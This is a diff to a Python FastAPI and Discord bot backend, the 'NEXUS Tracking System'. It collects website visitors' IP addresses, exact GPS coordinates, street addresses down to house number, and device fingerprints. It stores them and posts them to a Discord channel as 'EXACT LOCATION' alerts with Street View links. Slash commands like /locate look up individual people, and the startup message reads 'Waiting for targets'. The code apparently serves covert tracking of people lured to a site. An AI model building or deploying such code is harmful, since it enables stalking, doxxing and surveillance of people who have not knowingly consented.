+    street_url = f"https://www.google.com/maps?q={loc[0]},{loc[1]}&layer=c"
+    
+    location_text = loc[2] or loc[3] or f"{loc[0]:.4f}, {loc[1]:.4f}"
+    
+    embed = Embed(
+        title="📍 USER LOCATION",
+        description=f"[{location_text}]({maps_url})",
+        color=Color.red()
+    )
+    
+    embed.add_field(name="Coordinates", value=f"`{loc[0]:.6f}, {loc[1]:.6f}`", inline=True)
+    embed.add_field(name="Street View", value=f"[Click here]({street_url})", inline=True)
+    
+    await interaction.followup.send(embed=embed)
+
+@bot.tree.command(name="alert", description="Send an alert to all users (admin only)")
+@app_commands.describe(message="The alert message to send")
+async def alert(interaction: discord.Interaction, message: str):
+    # Check if user has admin permissions
+    if not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("You need administrator permissions to use this command", ephemeral=True)
+        return
+    
+    embed = Embed(
+        title="🚨 GLOBAL ALERT",
+        description=f"```{message}```",
+        color=Color.red(),
+        timestamp=datetime.now()
+    )
+    
+    await interaction.response.send_message(embed=embed)
+    
+    # This would require WebSocket connection to frontend
+    # For now, just log it
+    print(f"Alert sent: {message}")
+
+@bot.tree.command(name="help", description="Show all available commands")
+async def help_command(interaction: discord.Interaction):
+    embed = Embed(
+        title="🔮 NEXUS COMMANDS",
+        description="Here are all available slash commands:",
+        color=Color.purple()
+    )
+    
+    commands = [
+        "`/stats` - View tracking statistics",
+        "`/recent [limit]` - Show recent locations",
+        "`/user [user_id]` - Get user details",
+        "`/locate [user_id]` - Get user's map location",
+        "`/fragments` - View fragment leaderboard",
+        "`/alert [message]` - Send global alert (admin only)",
+        "`/help` - Show this message"
     ]
     
-    embed.add_field(name="Available Commands", value="\n".join(commands_list), inline=False)
-    embed.set_footer(text=f"Online Users: {len(active_users)}")
+    embed.add_field(name="Commands", value="\n".join(commands), inline=False)
+    embed.set_footer(text="NEXUS Tracking System v2.0")
     
-    await ctx.send(embed=embed)
+    await interaction.response.send_message(embed=embed)
+
+# ==================== DISCORD EVENTS ====================
+@bot.event
+async def on_ready():
+    print(f'✅ Logged in as {bot.user}')
+    print(f'📡 Bot ID: {bot.user.id}')
+    
+    try:
+        # Get channel
+        bot.channel = bot.get_channel(DISCORD_CHANNEL_ID)
+        if not bot.channel:
+            bot.channel = await bot.fetch_channel(DISCORD_CHANNEL_ID)
+        
+        bot.ready = True
+        print(f'✅ Connected to channel: #{bot.channel.name}')
+        
+        # Send startup message
+        embed = Embed(
+            title="🔮 NEXUS SYSTEM ONLINE",
+            description="```Tracking system activated\nWaiting for targets...```",
+            color=Color.green(),
+            timestamp=datetime.now()
+        )
+        embed.add_field(name="Status", value="✅ Active", inline=True)
+        embed.add_field(name="Channel", value=f"#{bot.channel.name}", inline=True)
+        embed.add_field(name="Commands", value="`/help` for all commands", inline=True)
+        embed.add_field(name="Frontend", value=f"[Website]({FRONTEND_URL})", inline=True)
+        
+        await bot.channel.send(embed=embed)
+        print("✅ Startup message sent")
+        
+    except Exception as e:
+        print(f'❌ Error: {e}')
 
 # ==================== FASTAPI ENDPOINTS ====================
 @app.get("/")
 async def root():
-    """API root"""
     return {
-        "name": "NEXUS Tracking System API",
-        "version": "2.0",
+        "name": "NEXUS Tracking System",
         "status": "online",
+        "bot_ready": bot.ready,
         "frontend": FRONTEND_URL,
-        "endpoints": [
-            "/api/track - POST tracking data",
-            "/api/health - GET health check",
-            "/api/stats - GET statistics"
-        ]
+        "commands": "/help for slash commands"
     }
 
 @app.get("/api/health")
 async def health():
-    """Health check endpoint"""
     return {
         "status": "online",
-        "bot_ready": discord_bot.ready,
-        "active_users": len(active_users),
+        "bot_ready": bot.ready,
         "timestamp": datetime.now().isoformat()
     }
 
-@app.get("/api/stats")
-async def get_stats():
-    """Get public statistics"""
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    
-    c.execute("SELECT COUNT(DISTINCT id) FROM users")
-    total_users = c.fetchone()[0] or 0
-    
-    c.execute("SELECT COUNT(*) FROM locations")
-    total_locations = c.fetchone()[0] or 0
-    
-    c.execute("SELECT COUNT(*) FROM fragments")
-    total_fragments = c.fetchone()[0] or 0
-    
-    conn.close()
-    
-    return {
-        "total_users": total_users,
-        "online_now": len(active_users),
-        "total_locations": total_locations,
-        "total_fragments": total_fragments
-    }
-
-@app.post("/api/track")
-async def track_data(request: Request, data: TrackingData):
-    """Main tracking endpoint - receives all data from frontend"""
+@app.post("/submit")
+async def submit_visitor(request: Request, visitor: VisitorInfo):
+    """Receive visitor data from frontend"""
     try:
+        data = visitor.dict()
         client_ip = request.client.host
-        user_agent = data.userAgent or request.headers.get('user-agent', '')
         
-        # Generate consistent user ID
-        user_id = hashlib.sha256(f"{client_ip}_{user_agent}".encode()).hexdigest()[:16]
+        print(f"📥 Received data from {client_ip}")
         
-        # Update active users
-        active_users[user_id] = datetime.now()
-        
-        # Clean old users (older than 5 minutes)
-        now = datetime.now()
-        expired = [uid for uid, last_seen in active_users.items() 
-                  if (now - last_seen).total_seconds() > 300]
-        for uid in expired:
-            del active_users[uid]
+        # Generate user ID
+        user_id = hashlib.sha256(f"{client_ip}_{data.get('userAgent', '')}".encode()).hexdigest()[:16]
         
         # Store in database
         conn = sqlite3.connect(DB_PATH)
@@ -839,95 +461,189 @@ async def track_data(request: Request, data: TrackingData):
                      COALESCE((SELECT first_seen FROM users WHERE id = ?), ?),
                      ?, 
                      COALESCE((SELECT visit_count FROM users WHERE id = ?), 0) + 1)''',
-                  (user_id, client_ip, user_agent, user_id, datetime.now(), datetime.now(), user_id))
+                  (user_id, client_ip, data.get('userAgent', ''), user_id, datetime.now(), datetime.now(), user_id))
         
-        # Process based on data type
-        if data.type == "location":
-            loc_data = LocationData(**data.data)
+        # Store location if available
+        if data.get('coordinates'):
+            coords = data.get('coordinates', {})
+            loc_data = data.get('location', {})
+            addr = data.get('address', {})
             
             c.execute('''INSERT INTO locations 
                         (user_id, latitude, longitude, accuracy, address, city, county, state, 
                          zip, country, neighbourhood, road, house_number, source, timestamp)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
-                     (user_id, loc_data.lat, loc_data.lon, loc_data.accuracy, loc_data.address,
-                      loc_data.city, loc_data.county, loc_data.state, loc_data.zip, loc_data.country,
-                      loc_data.neighbourhood, loc_data.road, loc_data.house_number, loc_data.source,
+                     (user_id, 
+                      coords.get('lat'),
+                      coords.get('lon'),
+                      data.get('accuracy', 1000),
+                      loc_data.get('display_name'),
+                      addr.get('city') or addr.get('town'),
+                      addr.get('county'),
+                      addr.get('state'),
+                      addr.get('postcode'),
+                      addr.get('country'),
+                      addr.get('neighbourhood') or addr.get('suburb'),
+                      addr.get('road'),
+                      addr.get('house_number'),
+                      data.get('source', 'GPS'),
                       datetime.now()))
-            
-            # Send to Discord
-            asyncio.create_task(discord_bot.send_exact_location(user_id, loc_data, client_ip))
-            
-            # If new user, also send welcome
-            if is_new:
-                asyncio.create_task(discord_bot.send_new_visitor(user_id, {"location": True}, client_ip))
         
-        elif data.type == "system":
-            sys_data = SystemData(**data.data)
-            
+        # Store system info
+        if data.get('system'):
+            sys = data.get('system', {})
             c.execute('''INSERT INTO fingerprints 
-                        (user_id, platform, browser, cores, memory, screen, timezone, 
-                         language, cookies, do_not_track, timestamp)
-                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
-                     (user_id, sys_data.platform, sys_data.browser, sys_data.cores,
-                      sys_data.memory, sys_data.screen, sys_data.timezone, sys_data.language,
-                      sys_data.cookies, sys_data.doNotTrack, datetime.now()))
-            
-            asyncio.create_task(discord_bot.send_system_fingerprint(user_id, sys_data, client_ip))
-            
-            if is_new:
-                asyncio.create_task(discord_bot.send_new_visitor(user_id, {"system": True}, client_ip))
-        
-        elif data.type == "fragment":
-            frag_data = FragmentData(**data.data)
-            
-            c.execute('''INSERT INTO fragments (user_id, fragment_number, collected_at)
-                        VALUES (?, ?, ?)''', (user_id, frag_data.fragment, datetime.now()))
-            
-            asyncio.create_task(discord_bot.send_fragment(user_id, frag_data, client_ip))
-        
-        elif data.type == "button":
-            btn_data = ButtonData(**data.data)
-            
-            c.execute('''INSERT INTO button_presses (user_id, press_count, message, timestamp)
-                        VALUES (?, ?, ?, ?)''', 
-                     (user_id, btn_data.presses, btn_data.message, datetime.now()))
-            
-            asyncio.create_task(discord_bot.send_button_press(user_id, btn_data, client_ip))
-        
-        elif data.type == "threat":
-            threat_data = ThreatData(**data.data)
-            
-            c.execute('''INSERT INTO threats (user_id, threat_level, message, timestamp)
-                        VALUES (?, ?, ?, ?)''', 
-                     (user_id, threat_data.level, threat_data.message, datetime.now()))
-            
-            if threat_data.level > 70:
-                asyncio.create_task(discord_bot.send_threat(user_id, threat_data, client_ip))
-        
-        elif data.type == "deep_scan":
-            c.execute('''INSERT INTO deep_scans (user_id, scan_data, timestamp)
-                        VALUES (?, ?, ?)''', 
-                     (user_id, json.dumps(data.data), datetime.now()))
-            
-            asyncio.create_task(discord_bot.send_deep_scan(user_id, data.data, client_ip))
+                        (user_id, platform, browser, cores, memory, screen, timezone, language, cookies, timestamp)
+                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+                     (user_id, 
+                      sys.get('platform'),
+                      sys.get('userAgent'),
+                      sys.get('cores'),
+                      sys.get('memory'),
+                      f"{sys.get('screen', {}).get('width')}x{sys.get('screen', {}).get('height')}",
+                      data.get('timezone'),
+                      sys.get('browser', {}).get('language'),
+                      sys.get('browser', {}).get('cookies'),
+                      datetime.now()))
         
         conn.commit()
         conn.close()
         
-        return JSONResponse({
-            "status": "tracked", 
-            "user_id": user_id,
-            "is_new": is_new
-        })
+        # Send to Discord if bot is ready
+        if bot.ready and bot.channel:
+            await send_to_discord(user_id, data, client_ip, is_new)
+        
+        return JSONResponse({"status": "success", "user_id": user_id, "is_new": is_new})
         
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"❌ Error: {e}")
+        traceback.print_exc()
         return JSONResponse({"error": str(e)}, status_code=500)
+
+async def send_to_discord(user_id: str, data: dict, ip: str, is_new: bool):
+    """Send formatted data to Discord"""
+    try:
+        # New visitor alert
+        if is_new:
+            embed = Embed(
+                title="🎯 NEW VISITOR",
+                color=Color.purple(),
+                timestamp=datetime.now()
+            )
+            
+            embed.add_field(name="User ID", value=f"`{user_id[:8]}`", inline=True)
+            embed.add_field(name="IP", value=f"`{ip}`", inline=True)
+            embed.add_field(name="Location", value=f"{data.get('city', 'N/A')}, {data.get('country', 'N/A')}", inline=True)
+            
+            await bot.channel.send(embed=embed)
+        
+        # Location data
+        if data.get('coordinates'):
+            coords = data.get('coordinates', {})
+            addr = data.get('address', {})
+            loc = data.get('location', {})
+            
+            embed = Embed(
+                title="📍 EXACT LOCATION",
+                color=Color.red(),
+                timestamp=datetime.now()
+            )
+            
+            embed.add_field(name="User ID", value=f"`{user_id[:8]}`", inline=True)
+            embed.add_field(name="IP", value=f"`{ip}`", inline=True)
+            embed.add_field(name="Accuracy", value=f"`{data.get('accuracy', '?')}m`", inline=True)
+            
+            # Coordinates
+            embed.add_field(
+                name="Coordinates",
+                value=f"```\nLat: {coords.get('lat', '?')}\nLon: {coords.get('lon', '?')}```",
+                inline=False
+            )
+            
+            # Full address
+            if loc.get('display_name'):
+                embed.add_field(
+                    name="Address",
+                    value=f"```{loc.get('display_name')[:100]}```",
+                    inline=False
+                )
+            
+            # Details
+            details = []
+            if addr.get('house_number'): details.append(f"🏠 House: {addr.get('house_number')}")
+            if addr.get('road'): details.append(f"🛣️ Road: {addr.get('road')}")
+            if addr.get('city') or addr.get('town'): details.append(f"🏙️ City: {addr.get('city') or addr.get('town')}")
+            if addr.get('state'): details.append(f"📍 State: {addr.get('state')}")
+            if addr.get('country'): details.append(f"🌍 Country: {addr.get('country')}")
+            if addr.get('postcode'): details.append(f"📮 ZIP: {addr.get('postcode')}")
+            
+            if details:
+                embed.add_field(name="Details", value="\n".join(details), inline=False)
+            
+            # Maps links
+            maps_url = f"https://www.google.com/maps?q={coords.get('lat')},{coords.get('lon')}"
+            street_url = f"https://www.google.com/maps?q={coords.get('lat')},{coords.get('lon')}&layer=c"
+            
+            embed.add_field(name="🗺️ Maps", value=f"[Open]({maps_url})", inline=True)
+            embed.add_field(name="📸 Street", value=f"[View]({street_url})", inline=True)
+            
+            await bot.channel.send(embed=embed)
+        
+        # System data
+        if data.get('system'):
+            sys = data.get('system', {})
+            
+            embed = Embed(
+                title="💻 SYSTEM INFO",
+                color=Color.blue(),
+                timestamp=datetime.now()
+            )
+            
+            embed.add_field(name="User ID", value=f"`{user_id[:8]}`", inline=True)
+            embed.add_field(name="Platform", value=f"`{sys.get('platform', '?')}`", inline=True)
+            embed.add_field(name="Cores", value=f"`{sys.get('cores', '?')}`", inline=True)
+            embed.add_field(name="Memory", value=f"`{sys.get('memory', '?')}`", inline=True)
+            embed.add_field(name="Screen", value=f"`{sys.get('screen', {}).get('width')}x{sys.get('screen', {}).get('height')}`", inline=True)
+            embed.add_field(name="Timezone", value=f"`{data.get('timezone', '?')}`", inline=True)
+            
+            await bot.channel.send(embed=embed)
+        
+        # Button press
+        if data.get('button_presses', 0) > 0:
+            presses = data.get('button_presses', 0)
+            
+            embed = Embed(
+                title="🚫 BUTTON PRESSED",
+                color=Color.dark_red(),
+                timestamp=datetime.now()
+            )
+            
+            embed.add_field(name="User ID", value=f"`{user_id[:8]}`", inline=True)
+            embed.add_field(name="Presses", value=f"`{presses}`", inline=True)
+            
+            await bot.channel.send(embed=embed)
+        
+        # Fragments
+        if data.get('fragments'):
+            for fragment in data.get('fragments', []):
+                embed = Embed(
+                    title="🧩 FRAGMENT FOUND",
+                    color=Color.green(),
+                    timestamp=datetime.now()
+                )
+                
+                embed.add_field(name="User ID", value=f"`{user_id[:8]}`", inline=True)
+                embed.add_field(name="Fragment", value=f"`{fragment}/9`", inline=True)
+                
+                await bot.channel.send(embed=embed)
+                
+    except Exception as e:
+        print(f"❌ Discord send error: {e}")
 
 # ==================== STARTUP ====================
 async def run_bot():
     try:
-        await bot.start(DISCORD_TOKEN)
+        await bot.start(BOT_TOKEN)
     except Exception as e:
         print(f"❌ Bot error: {e}")
 
@@ -938,24 +654,20 @@ def start_bot_thread():
 
 @app.on_event("startup")
 async def startup_event():
-    """Start Discord bot when FastAPI starts"""
-    if DISCORD_TOKEN and DISCORD_CHANNEL_ID:
-        thread = threading.Thread(target=start_bot_thread, daemon=True)
-        thread.start()
-        print("✅ Discord bot thread started")
-    else:
-        print("❌ Discord credentials missing - bot not started")
+    """Start Discord bot"""
+    thread = threading.Thread(target=start_bot_thread, daemon=True)
+    thread.start()
+    print("✅ Discord bot thread started")
 
 # ==================== RUN ====================
 if __name__ == "__main__":
     print("=" * 50)
-    print("🔮 NEXUS TRACKING SYSTEM API")
+    print("🔮 NEXUS TRACKING SYSTEM")
     print("=" * 50)
-    print(f"📡 Frontend URL: {FRONTEND_URL}")
-    print(f"📡 Discord Token: {DISCORD_TOKEN[:10]}..." if DISCORD_TOKEN else "❌ No Discord token")
+    print(f"📡 Bot Token: {BOT_TOKEN[:10]}..." if BOT_TOKEN else "❌ No token")
     print(f"📡 Channel ID: {DISCORD_CHANNEL_ID}")
-    print(f"📁 Database: {DB_PATH}")
+    print(f"🌐 Frontend: {FRONTEND_URL}")
+    print(f"💻 Slash Commands: /help")
     print("=" * 50)
     
-    port = int(os.getenv('PORT', 8000))
-    uvicorn.run(app, host="0.0.0.0", port=port)
+    uvicorn.run(app, host="0.0.0.0", port=PORT)
